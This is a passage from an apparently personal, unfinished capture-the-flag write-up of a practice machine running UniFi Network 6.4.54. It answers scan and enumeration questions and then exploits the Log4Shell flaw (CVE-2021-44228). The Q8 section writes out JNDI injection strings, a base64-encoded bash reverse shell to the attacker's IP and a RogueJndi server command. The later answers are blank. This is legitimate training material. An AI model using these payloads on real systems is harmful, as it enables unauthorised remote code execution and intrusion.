
Q1: Which are the first four open ports?

A: 22, 6789, 8080, 8443

Scan with nmap with -sV flag.

![](../../Img/Pasted%20image%2020250424150410.png)

Q2: What is the title of the software that is running running on port 8443?

A: UniFi Network

I had to run the scan again with the -sC flag
![](../../Img/Pasted%20image%2020250424151327.png)

Q3: What is the version of the software that is running?

A: 6.4.54

There wasn't version number in the scan, so digging around i went to the web page of this service (on port 8443) and got this.
![](../../Img/Pasted%20image%2020250424151922.png)

Q4: What is the CVE for the identified vulnerability?

A: CVE-2021-44228

Googleing aroudn i found this github repo (https://github.com/puzzlepeaches/Log4jUnifi) that had the answer.

Q5: What protocol does JNDI leverage in the injection?

A: LDAP

Looking at that cve we get it.
![](../../Img/Pasted%20image%2020250424153434.png)

Q6: What tool do we use to intercept the traffic, indicating the attack was successful?

A: tcpdump

It's just the tool for that.

Q7: What port do we need to inspect intercepted traffic for?

A: 389

It looks like ldap traffic goes to port 389
![](../../Img/Pasted%20image%2020250424155244.png)


Q8: What port is the MongoDB service running on?

A: 27117

So, according to this article (https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) in the remember parameter goes a payload ("${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\"), but as i'm not using that tool (dnslog.cn) i just use my ip and tcpdump
I get an error
![](../../Img/Pasted%20image%2020250424160606.png)
but also a connection
![](../../Img/Pasted%20image%2020250424160627.png)
With this command we can encrypt the payload for the jndi echo 'bash -c bash -i >&/dev/tcp/{ip}/3333 0>&1' | base64
We insert that payload in the command for starting the jndi sv java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTU3LzMzMzMgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.157"
![](../../Img/Pasted%20image%2020250424162840.png)
in burp suite we replace the payload form the remember parameter with our new jdni port (${jndi:ldap://10.10.15.157/:1389/o=tomcat})
we get the connection
![](../../Img/Pasted%20image%2020250424163652.png)
Upgrade it (script /dev/null -c bash)
Now finally for the question let's check if mongo is running (ps aux | grep mongo)
![](../../Img/Pasted%20image%2020250424163929.png)

Q9: What is the default database name for UniFi applications?

A:  ace

Before i had the genius ground breaking idea of just G
![](../../Img/Pasted%20image%2020250424164412.png)
![](../../Img/Pasted%20image%2020250424164226.png)

Q10: What is the function we use to enumerate users within the database in MongoDB?

A: 

Q11: What is the function we use to update users within the database in MongoDB?

A: 

Q12: What is the password for the root user?

A: 

Q13: Submit user flag

A: 

Q14: Submit root flag

A: 
